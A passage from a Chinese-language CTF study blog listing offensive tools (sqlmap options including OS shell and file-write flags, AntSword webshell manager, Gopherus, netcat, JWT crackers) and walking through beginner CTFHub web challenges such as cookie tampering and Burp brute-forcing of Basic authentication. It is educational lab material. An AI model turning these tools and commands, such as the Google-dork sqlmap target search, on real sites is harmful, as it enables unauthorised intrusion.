access</span><br><span class="line"></span><br><span class="line">--file-read                            从目标数据库管理文件系统读取文件</span><br><span class="line"></span><br><span class="line">--file-write                           上传文件到目标数据库管理文件系统</span><br><span class="line"></span><br><span class="line">--file-dest                             指定写入文件的绝对路径</span><br><span class="line"></span><br><span class="line">--os-cmd=                           执行操作系统命令</span><br><span class="line"></span><br><span class="line">--os-shell                            交互式的系统shell</span><br><span class="line"></span><br><span class="line">--os-pwn                             获取一个OOB shell，Meterpreter或者VNC</span><br><span class="line"></span><br><span class="line">--os-smbrelay                    一键 获取一个OOB shell，Meterpreter或者VNC</span><br><span class="line"></span><br><span class="line">--os-bof                              储存过程缓冲区溢出利用</span><br><span class="line"></span><br><span class="line">--os-esc                              数据库进程用户权限提升</span><br><span class="line"></span><br><span class="line">--msf-path=                        Metasploit  Framework本地安装路径</span><br><span class="line"></span><br><span class="line">General</span><br><span class="line"></span><br><span class="line">-s                                     sqlite会话文件保存位置</span><br><span class="line"></span><br><span class="line">-t                                      记录所有HTTP流量到指定文件中</span><br><span class="line"></span><br><span class="line">--batch                             测试过程中， 执行所有默认配置</span><br><span class="line"></span><br><span class="line">--charset=v                      强制用于数据检索的字符编码 </span><br><span class="line"></span><br><span class="line">--crawl=                           从目标URL开始爬取网站</span><br><span class="line"></span><br><span class="line">--crawl-exclude=              禁止爬取某个页面（eg：logout）</span><br><span class="line"></span><br><span class="line">--csv-del=                        指定CSV输出中使用的的字符</span><br><span class="line"></span><br><span class="line">--dump-format=               储存数据的方式（CSV(default)，HTML，SQLITE）</span><br><span class="line"></span><br><span class="line">--flush-session                 刷新当前目标的会话文件</span><br><span class="line"></span><br><span class="line">--fresh-queries                 忽略会话文件中储存的查询结果，重新查询</span><br><span class="line"></span><br><span class="line">--hex                                使用DBMS hex函数进行数据检索</span><br><span class="line"></span><br><span class="line">--outpout-dir=                  自定义输出目录</span><br><span class="line"></span><br><span class="line">--save=                            保存选项到INI配置文件中</span><br><span class="line"></span><br><span class="line">--scope=                          使用正则表达式从提供的日志中guo&#x27;l</span><br><span class="line"></span><br><span class="line">--alert                               再找到SQL注入时运行主机操作系统命令</span><br><span class="line"></span><br><span class="line">--purge-output                  安全的从输出目录中删除所有内容</span><br><span class="line"></span><br><span class="line">--sqlmap-shell                  提示输入交互式sqlmap  shell</span><br><span class="line"></span><br><span class="line">--update                           更新sqlmap</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="2-注入技术简介">2.注入技术简介</h5><p>–technique=   （默认全部使用）</p><p>B    基于布尔的盲注</p><p>T    基于时间的盲注</p><p>E    基于报错的注入</p><p>U    基于UNION查询注入</p><p>S    基于多语句查询注入</p><h5 id="3-获取目标方式">3.获取目标方式</h5><p>1.指定目标url</p><p><code>sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;</code></p><p>2.从文件中获取多个url</p><p><code>sqlmap -m 1.txt</code></p><p>3.从文件中加载HTTP请求</p><p><code>sqlmap -r  url.txt</code></p><p>4.利用google获取目标</p><p><code>sqlmap -g &quot;inurl:\&quot;.php?id=1\&quot;&quot;</code></p><p>5.从burp日志中获取目标</p><p><code>sqlmap -l    burp.txt</code></p><h4 id="9-HackBar">9.HackBar</h4><p>Hackbar是一个Firefox的插件,它的功能类似于地址栏,但是它里面的数据不受服务器的相应触发的重定向等其它变化的影响。<br>有网址的载入于访问,联合查询,各种编码,数据加密功能。<br>这个Hackbar可以帮助你在测试SQL注入,XSS漏洞和网站的安全性,主要是帮助开发人员做代码的安全审计,检查代码,寻找安全漏洞。<br>Hackbar 在Burpsuite中也有该插件<br><a href="https://blog.csdn.net/qq_36292543/article/details/118938996">安装及使用教程</a></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/other/1.png" alt=""></p><h4 id="10-XSS渗透测试管理系统">10.XSS渗透测试管理系统</h4><p>网上推荐的有xss-platform或者BlueLotus_XSS，本人用的是BlueLotus_XSS（因为有docker比较方便部署）,下面的方法亲测有用（xss-flatform的我还没有用，所以我还是建议用BlueLotus_XSS）</p><p>（如果是在不会搭建，我搭建的可以借个你用<s>但是我服务器到期时间24-03-25</s>.，私信我）</p><h5 id="1-xss-flatform">1.xss-flatform</h5><p><a href="https://www.cnblogs.com/Cl0ud/p/12176961.html">搭建xss-platform平台 </a></p><h5 id="2-BlueLotus-XSS">2.BlueLotus_XSS</h5><p><a href="https://zhuanlan.zhihu.com/p/454115573">docker搭建xss平台</a></p><h4 id="11-中国蚁剑">11.中国蚁剑</h4><p>中国蚁剑是一款开源的跨平台网站管理工具，它主要面向于合法授权的渗透测试安全人员以及进行常规操作的网站管理员。是一款非常优秀的webshell管理工具。</p><p>通俗的讲：中国蚁剑是 一 款比菜刀还牛的shell控制端软件。</p><p>中国蚁剑推崇模块化的开发思想，遵循开源，就要开得漂亮的原则，致力于为不同层次的人群提供最简单易懂、方便直接的代码展示及其修改说明，努力让大家可以一起为这个项目贡献出力所能及的点点滴滴，让这款工具真正能让大家用得顺心、舒适，让它能为大家施展出最人性化最适合你的能力！</p><h6 id="核心功能">核心功能</h6><ul><li>Shell代理功能</li><li>Shell管理</li><li>文件管理</li><li>虚拟终端</li><li>数据库管理</li><li>插件市场</li><li>插件开发</li></ul><p><a href="https://blog.csdn.net/weixin_41924764/article/details/108099952">中国蚁剑(AntSword)安装、使用教程</a></p><p>如果只下载了antSword，启动目录里面的exe文件会自动下载AntSword加速器，记得用管理员身份下载，不然安装会失败，然后最好放到虚拟机里面，报毒就不需要管了，留下来也没有问题。第二次点击exe文件就能打开了</p><h4 id="12-Gopherus">12.Gopherus</h4><p>Gopherus工具是用来专门生成gopher协议的payload工具，通过gopher协议的以及各种被攻击应用的tcp包特点来构造payload</p><p>目前支持生成payload应用有：</p><ul><li>MySQL (Port:3306)</li><li>FastCGI (Port:9000)</li><li>Memcached (Port:11211)</li><li>Redis (Port:6379)</li><li>Zabbix (Port:10050)</li><li>SMTP (Port:25)</li></ul><p><a href="https://github.com/tarunkant/Gopherus">github地址</a></p><p>下载后记得使用python2.x,我用python3不行</p><p>然后就是我是在kali里面下载的，我windows运行的话会乱码😥</p><p>简单指令就是</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 gopherus --exploit *** # ***是选择的被攻击的类型</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:center">Command</th><th style="text-align:center">Description</th></tr></thead><tbody><tr><td style="text-align:center">gopherus --help</td><td style="text-align:center">Help</td></tr><tr><td style="text-align:center">gopherus --exploit</td><td style="text-align:center">Arguments can be :</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">–exploit mysql</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">–exploit postgresql</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">–exploit fastcgi</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">–exploit redis</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">–exploit zabbix</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">–exploit pymemcache</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">–exploit rbmemcache</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">–exploit phpmemcache</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">–exploit dmpmemcache</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">–exploit smtp</td></tr></tbody></table><h4 id="13-nc"><a href="http://13.nc">13.nc</a></h4><p><a href="https://zhuanlan.zhihu.com/p/600617533">nc命令用法实例总结</a></p><p>nc是netcat的简写，有着网络界的瑞士军刀美誉。因为它短小精悍、功能实用，被设计为一个简单、可靠的网络工具</p><p><strong>作用</strong></p><p>1、实现任意TCP/UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口</p><p>2、端口的扫描，nc可以作为client发起TCP或UDP连接</p><p>3、机器之间传输文件</p><p>4、机器之间网络测速</p><p><strong>参数</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">-g&lt;网关&gt; 设置路由器跃程通信网关，最多可设置8个。</span><br><span class="line"></span><br><span class="line">-G&lt;指向器数目&gt; 设置来源路由指向器，其数值为4的倍数。</span><br><span class="line"></span><br><span class="line">-h 在线帮助。</span><br><span class="line"></span><br><span class="line">-i&lt;延迟秒数&gt; 设置时间间隔，以便传送信息及扫描通信端口。</span><br><span class="line"></span><br><span class="line">-l 使用监听模式，管控传入的资料。</span><br><span class="line"></span><br><span class="line">-n 直接使用IP地址，而不通过域名服务器。</span><br><span class="line"></span><br><span class="line">-o&lt;输出文件&gt; 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。</span><br><span class="line"></span><br><span class="line">-p&lt;通信端口&gt; 设置本地主机使用的通信端口。</span><br><span class="line"></span><br><span class="line">-r 乱数指定本地与远端主机的通信端口。</span><br><span class="line"></span><br><span class="line">-s&lt;来源位址&gt; 设置本地主机送出数据包的IP地址。</span><br><span class="line"></span><br><span class="line">-u 使用UDP传输协议。</span><br><span class="line"></span><br><span class="line">-v 显示指令执行过程。</span><br><span class="line"></span><br><span class="line">-w&lt;超时秒数&gt; 设置等待连线的时间。</span><br><span class="line"></span><br><span class="line">-z 使用0输入/输出模式，只在扫描通信端口时使用。</span><br></pre></td></tr></table></figure><h4 id="14-c-jwt-cracker">14.c-jwt-cracker</h4><p>下载地址：<a href="https://github.com/brendan-rius/c-jwt-cracker">brendan-rius/c-jwt-cracker: JWT brute force cracker written in C (github.com)</a></p><p>我是下载到kali里面</p><p>下载之后记得make一下</p><p>我的提醒我没有openssl文件</p><p>使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libssl-dev</span><br></pre></td></tr></table></figure><p>就能下载成功了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/JSON%20Web%20Token/15.png" alt=""></p><p>15.jwt_tool</p><p>用git下载到kali里面就行了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/ticarpi/jwt_tool.git</span><br></pre></td></tr></table></figure><p>有密码验证的地方就会有爆破，不过<code>JWT</code>的密钥爆破需要一定的前提条件：</p><ul><li>已知<code>JWT</code>使用的加密算法</li><li>已知一段有效的、已签名的<code>token</code></li><li>签名使用的密钥是弱密钥（可以爆破出来）</li></ul><h2 id="1-Web"><a href="http://1.Web">1.Web</a></h2><h3 id="Web-前置技能">Web 前置技能</h3><h4 id="HTTP-协议">HTTP 协议</h4><h5 id="1-请求方式">1.请求方式</h5><p>题目</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/request/1.png" alt="1.png"></p><p><s>本人英语不行＞﹏＜</s></p><p>但是大概的意思就是这个 HTTP 请求的方式是 GET，要我们使用 CTFHUB 的方式请求才能给我们 flag</p><p>我们可以打开 F12 看网络监听看到 index.php，改变请求方式有两种</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/request/2.png" alt="2.png"></p><h6 id="1-curl-2">1.curl</h6><p>使用 cmd 的 curl 去请求界面</p><p>输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v -X CTFHUB http://challenge-35ed37f948637891.sandbox.ctfhub.com:10800/index.php</span><br></pre></td></tr></table></figure><p>返回了一个 flag</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/request/3.png" alt="3.png"></p><p>当然后面的网站我们应该不一样<s>不能偷懒直接复制</s></p><h6 id="2-burp-2">2.burp</h6><p>过程就是用 proxy 模块抓包，然后 seng 到 repeater 模块进行修改 methed，最后 send 就能得到 flag</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/request/4.png" alt="4.png"></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/request/5.png" alt="5.png"></p><h5 id="2-302-跳转">2. 302 跳转</h5><p>前置知识</p><ol><li><p>HTTP 重定向</p><p>服务器无法处理浏览器发送过来的请求（request），服务器告诉浏览器跳转到可以处理请求的 url 上。（浏览器会自动访问该 URL 地址，以至于用户无法分辨是否重定向了。）<br>重定向的返回码 3XX 说明。Location 响应首部包含了内容的新地址或是优选地址的 URL。</p></li><li><p>状态码</p><p><a href="https://www.runoob.com/http/http-status-codes.html">状态码大全</a></p><ul><li>301 redirect: 301 代表永久性转移(Permanently Moved)，在请求的 URL 已被移除时使用。响应的 Location 首部中应该包含资源现在所处的 URL。</li><li>302 redirect: 302 代表暂时性转移(Temporarily Moved )，与 301 状态码类似，但是，客户端应该使用 Location 首部给出的 URL 来临时定位资源，将来的请求仍然使用老的 URL。</li><li>304 redirect: 如果客户端发送了一个带条件的 GET 请求且该请求已被允许，而文档的内容（自上次访问以来或者根据请求的条件）并没有改变，则服务器应当返回这个 304 状态码。简单的表达就是：服务端已经执行了 GET，但文件未变化。</li><li>301 和 302 状态码都表示重定向，就是说浏览器在拿到服务器返回的这个状态码后会自动跳转到一个新的 URL 地址，这个地址可以从响应的 Location 首部中获取（用户看到的效果就是他输入的地址 A 瞬间变成了另一个地址 B）——这是它们的共同点。他们的不同在于。301 表示旧地址 A 的资源已经被永久地移除了（这个资源不可访问了），搜索引擎在抓取新内容的同时也将旧的网址交换为重定向之后的网址；302 表示旧地址 A 的资源还在（仍然可以访问），这个重定向只是临时地从旧地址 A 跳转到地址 B，搜索引擎会抓取新的内容而保存旧的网址。</li></ul></li><li><p>HTTP 中的重定向和请求转发的区别</p><p>转发是服务器行为，重定向是客户端行为。为什么这样说呢，这就要看两个动作的工作流程：</p><p><strong>转发过程：客户浏览器发送 http 请求——&gt;web 服务器接受此请求——&gt;调用内部的一个方法在容器内部完成请求处理和转发动作——&gt;将目标资源发送给客户；</strong></p><p>在这里，转发的路径必须是同一个 web 容器下的 url，其不能转向到其他的 web 路径上去，中间传递的是自己的容器内的 request。在客户浏览器路径栏显示的仍然是其第一次访问的路径，也就是说客户是感觉不到服务器做了转发的。<strong>转发行为是浏览器只做了一次访问请求</strong>。</p><p><strong>重定向过程：客户浏览器发送 http 请求——&gt;web 服务器接受后发送 302 状态码响应及对应新的 location 给客户浏览器——&gt;客户浏览器发现是 302 响应，则自动再发送一个新的 http 请求，请求 url 是新的 location 地址——&gt;服务器根据此请求寻找资源并发送给客户。</strong></p><p>在这里 location 可以重定向到任意 URL，既然是浏览器重新发出了请求，则就没有什么 request 传递的概念了。在客户浏览器路径栏显示的是其重定向的路径，客户可以观察到地址的变化的。<strong>重定向行为是浏览器做了至少两次的访问请求的</strong>。</p><p>客户端 request A,服务器响应，并 response 回来，告诉浏览器，你应该去 B。这个时候 IE 可以看到地址变了，而且历史的回退按钮也亮了。<strong>重定向可以访问自己 web 应用以外的资源。在重定向的过程中，传输的信息会被丢失</strong>。</p></li></ol><p>这些在浏览器或者 burp 里面抓的包都能看到</p><p>先看题目</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/302/1.png" alt="1.png"></p><p>点击 Give me flag 后</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/302/2.png" alt="2.png"></p><p>可以看到链接进行了跳转，这时候我们打开 f12 发现 302</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/302/3.png" alt="3.png"></p><p>发现获取 favicon.ico 时出现的 302</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/302/4.png" alt="4.png"></p><p>同时我们去看 burp，发现当我们在在第一个页面访问第二个页面时抓包，发现最初访问的是 index.php 而不是出现的是 index.html，（下面第一个图是点击了 Give me flag 去第二个页面，第二个图是在第二个页面刷新了一下）这就是暂时性跳转 302，原网址依然保留，接着直接请求它</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/302/7.png" alt="5.png"></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/302/8.png" alt="6.png"></p><h6 id="1-curl-3">1.curl</h6><p>因为 curl 不会进行跳转，curl -L 会跟随跳转</p><p>直接抓取出现 302 的域名（注意别输入错误）</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/302/5.png" alt="7.png"></p><h6 id="2-burp-3">2.burp</h6><p>老样子转给 repeater 处理</p><p>把 index.html 换成 index.php 即可</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/302/6.png" alt="8.png"></p><h5 id="3-Cookie">3.Cookie</h5><p>所谓“cookie”数据是指某些网站为了辨别用户身份，储存在用户本地终端上的数据（通常经过加密），由用户客户端计算机暂时或永久保存的信息。Cookie 是一段不超过 4KB 的小型<a href="https://baike.baidu.com/item/%E6%96%87%E6%9C%AC/5443630?fromModule=lemma_inlink">文本</a>数据，由一个名称（Name）、一个值（Value）和其它几个用于控制 Cookie 有效期、安全性、使用范围的可选属性组成。</p><p>简单介绍一下 cookie 和 session</p><ol><li><p>session<br>简单的说，当你登陆一个网站的时候，如果 web 服务器端使用的是 session，那么所有的数据都保存在服务器上，客户端每次请求服务器的时候会发送当前会话 sessionid，服务器根据当前 sessionid 判断相应的用户数据标志，以确定用户是否登陆或具有某种权限。由于数据是存储在服务器上面，所以你不能伪造。</p></li><li><p>cookie<br>sessionid 是服务器和客户端连接时候随机分配的，如果浏览器使用的是 cookie，那么所有数据都保存在浏览器端，比如你登陆以后，服务器设置了 cookie 用户名，那么当你再次请求服务器的时候，浏览器会将用户名一块发送给服务器，这些变量有一定的特殊标记。服务器会解释为 cookie 变量，所以只要不关闭浏览器，那么 cookie 变量一直是有效的，所以能够保证长时间不掉线。</p><p>如果你能够截获某个用户的 cookie 变量，然后伪造一个数据包发送过去，那么服务器还是 认为你是合法的。所以，使用 cookie 被攻击的可能性比较大。</p><p>如果 cookie 设置了有效值，那么 cookie 会保存到客户端的硬盘上，下次在访问网站的时候，浏览器先检查有没有 cookie，如果有的话，读取 cookie，然后发送给服务器。</p><p>所以你在机器上面保存了某个论坛 cookie，有效期是一年，如果有人入侵你的机器，将你的 cookie 拷走，放在他机器下面，那么他登陆该网站的时候就是用你的身份登陆的。当然，伪造的时候需要注意，直接 copy cookie 文件到 cookie 目录，浏览器是不认的，他有一个 index.dat 文件，存储了 cookie 文件的建立时间，以及是否有修改，所以你必须先要有该网站的 cookie 文件，并且要从保证时间上骗过浏览器.</p></li><li><p>共同点</p><p>cookie 和 session 都是用来跟踪浏览器用户身份的会话方式。</p></li><li><p>区别</p><p>cookie 数据保存在客户端，session 数据保存在服务端。</p></li></ol><p>然后就是关于本题</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/cookie/6.png" alt="1.png"></p><p>大意是只有 admin 才能获取 flag，这个时候我们直接去找 cookie 就行了</p><h6 id="1-burp">1.burp</h6><p>使用 burp 发现 admin=0，改成 1 就行</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/cookie/0.png" alt="2.png"></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/cookie/1.png" alt="3.png"></p><h6 id="2-f12">2.f12</h6><p>去找浏览器的 cookie 值，并改成 1</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/cookie/2.png" alt="4.png"></p><p>直接去存储里面去找</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/cookie/4.png" alt="5.png"></p><p>或者用 document 找 cookie</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/cookie/5.png" alt="6.png"></p><p>记得刷新。</p><h5 id="4-基础认证">4.基础认证</h5><p>题目介绍：在 HTTP 中，基本认证（英语：Basic access authentication）是允许 http 用户代理（如：网页浏览器）在请求时，提供 用户名 和 密码 的一种方式。详情请查看 <a href="https://zh.wikipedia.org/wiki/HTTP">维基百科</a>（维基百科需要翻墙）基本认证</p><p>下面是维基百科内容（简单摘了一点）</p><blockquote><p>在<a href="https://zh.wikipedia.org/wiki/HTTP">HTTP</a>中，<strong>基本认证</strong>（英语：Basic access authentication）是允许<a href="https://zh.wikipedia.org/wiki/%E7%94%A8%E6%88%B7%E4%BB%A3%E7%90%86">http 用户代理</a>（如：<a href="https://zh.wikipedia.org/wiki/%E7%BD%91%E9%A1%B5%E6%B5%8F%E8%A7%88%E5%99%A8">网页浏览器</a>）在请求时，提供 <a href="https://zh.wikipedia.org/wiki/%E7%94%A8%E6%88%B7%E5%90%8D">用户名</a> 和 <a href="https://zh.wikipedia.org/wiki/%E5%8F%A3%E4%BB%A4">密码</a> 的一种方式。</p><p>在进行基本认证的过程里，请求的<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5">HTTP 头字段</a>会包含<code>Authorization</code>字段，形式如下： <code>Authorization: Basic &lt;凭证&gt;</code>，该凭证是用户和密码的组和的<a href="https://zh.wikipedia.org/wiki/Base64">base64 编码</a>。</p><p>优点：HTTP 基本认证 是一种十分简单的技术，使用的是 <a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5">HTTP 头部字段</a> 强制用户访问网络资源，而不是通过必要的<a href="https://zh.wikipedia.org/wiki/Cookie">cookie</a>、会话 ID、登录页面等（非获取<a href="https://zh.wikipedia.org/wiki/%E5%AD%98%E5%8F%96%E6%8E%A7%E5%88%B6">访问控制</a>的）手段。</p><p>基本上所有流行的网页浏览器都支持基本认证[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%81#cite_note-2">2]</a>。基本认证很少在可公开访问的<a href="https://zh.wikipedia.org/wiki/%E4%BA%92%E8%81%94%E7%BD%91">互联网</a><a href="https://zh.wikipedia.org/wiki/%E7%BD%91%E7%AB%99">网站</a>上使用，有时候会在小型私有系统中使用（如<a href="https://zh.wikipedia.org/wiki/%E8%B7%AF%E7%94%B1%E5%99%A8">路由器</a>网页管理接口）。之后诞生的 <a href="https://zh.wikipedia.org/wiki/HTTP%E6%91%98%E8%A6%81%E8%AE%A4%E8%AF%81">HTTP 摘要认证</a> 用于替代基本认证，允许密钥以相对安全的方式在不安全的通道上传输。</p><p>程序员和系统管理员有时会在可信网络环境中使用基本认证。由于，基本认证使用的是 Base64，可解码成明文，因此使用<a href="https://zh.wikipedia.org/wiki/Telnet">Telnet</a>等网络协议工具进行监视时，可以直接获取内容，并用于诊断。</p><p>缺点：基本认证 并没有为传送凭证（英语：transmitted credentials）提供任何机密性的保护。仅仅使用 <a href="https://zh.wikipedia.org/wiki/Base64">Base64</a> 编码并传输，而没有使用任何 <a href="https://zh.wikipedia.org/wiki/%E5%8A%A0%E5%AF%86">加密</a> 或 <a href="https://zh.wikipedia.org/wiki/%E5%93%88%E5%B8%8C">散列算法</a>。因此，基本认证常常和 HTTPS 一起使用，以提供机密性。</p><p>现存的浏览器保存认证信息直到标签页或浏览器被关闭，或者用户清除历史记录。[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%81#cite_note-3">3]</a>HTTP没有为服务器提供一种方法指示客户端丢弃这些被缓存的密钥。这意味着服务器端在用户不关闭浏览器的情况下，并没有一种有效的方法来让用户退出。</p><p>同时 HTTP 并没有提供<a href="https://zh.wikipedia.org/wiki/%E7%99%BB%E5%87%BA">退出</a>机制。但是，在一些浏览器上，存在清除凭证（credentials ）缓存的方法。</p></blockquote><p>说实话，第一次见，完全摸不着头脑，下载了附件，看到了是密码字典，感觉确实是利用 burp 进行爆破字典，<s>但由于接触 burp 时间甚少，只知道有这个模块</s></p><p>虽然网上也有很多教程，但是毕竟我都跟着做了一遍，这里就记录一下吧</p><h6 id="1-burp-2">1.burp</h6><p>首先还是经典 burp 抓包</p><p>首先进入链接,点击 click</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/authorization/0.png" alt="1.png"></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/authorization/2.png" alt="2.png"></p><p>如果直接取消会进入，在此之前我们先抓包</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/authorization/1.png" alt="3.png"></p><p>send 后发现“Do u know admin ?”推断用户名应该是 admin</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/authorization/3.png" alt="4.png"></p><p>然后再次去输入账号用户名和密码后进行抓包发现了一串 base64 编码，随便去个<a href="https://www.toolhelper.cn/EncodeDecode/Base64EncodeDecode">网站</a>)进行解码</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/authorization/4.png" alt="7.png"></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/authorization/5.png" alt="5.png"></p><p>发现刚好是我刚才输入的账号密码，注意这里有个<code>:</code></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/authorization/6.png" alt="6.png"></p><p>然后就是利用 burp 进行爆破</p><p>首先将刚才获取的包 send 给 Intruder 模块，选择 Sniper（狙击手）模式，然后选择 Basic 后面那一串，然后点击 Add，然后两边就会出现“<strong>§</strong>”这种字符</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/authorization/7.png" alt="8.png"></p><p>接着转入到 payloads 进行设置 在 Payload Options 上点击 Load 打开刚刚下载的附件密码包</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/authorization/13.png" alt="14.png"></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/authorization/8.png" alt="9.png"></p><p>然后设置 rule，add 选择 add prefix（添加前缀），即我们刚才的<code>admin:</code></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/authorization/9.png" alt="10.png"></p><p>再次 add 添加 encode 解码部分选择 base64</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/authorization/10.png" alt="11.png"></p><p>最后记得取消下面的 √（机翻：这个选择能在最终 payload（有效负载）中对选定的字符进行 url 编码，以便在 HTTP 请求中安全传输）</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/authorization/11.png" alt="12.png"></p><p>最后得到的样子是</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/authorization/12.png" alt="13.png"></p><p>最后点击右上角的 start attack 进行爆破</p><p>等它跑密码，记得开跑前把代理关掉，然后跑的过程中会发现有一条的 Status 和 Length 不同，点开这个复制 Basic 值，然后到 Decoder 进行编译，得到用户名和密码，然后拿着用户名和密码去登录，得到 flag。</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/authorization/14.png" alt="15.png"></p><p>总结</p><p>1.了解 burp 的新功能，可以增加爆破字典的规则，增加前缀、后缀、编码…等</p><p>2.基础认证（basic 认证）：<br>Basic 认证是一种较为简单的 HTTP 认证方式，客户端通过明文（Base64 编码格式）传输用户名和密码到服务端进行认证，通常需要配合 HTTPS 来保证信息传输的安全。</p><p>当 request 第一次到达服务器时，服务器没有认证的信息，服务器会返回一个 401 Unauthozied 给客户端。<br>认证之后将认证信息放在 session，以后在 session 有效期内就不用再认证了</p><h5 id="5-响应包源代码">5.响应包源代码</h5><h6 id="1-f12">1.f12</h6><p>顾名思义，在发送 request 后得到的 response 里面直接看源码就行了<s>我还以为是要玩贪吃蛇</s></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/response/1.png" alt="1.png"></p><h3 id="Web-实战">Web 实战</h3><h4 id="1-信息泄露">1.信息泄露</h4><h5 id="1-目录遍历">1.目录遍历</h5><p>题目</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/information%20leakage/0.png" alt="1.png"></p><p>就是自己一个一个去找就行了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/information%20leakage/1.png" alt="2.png"></p><h5 id="2-PHPINFO">2.PHPINFO</h5><p>题目</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/information%20leakage/2.png" alt="1.png"></p><p>直接在页面使用 ctrl + f 寻找</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/information%20leakage/3.png" alt="3.png"></p><h5 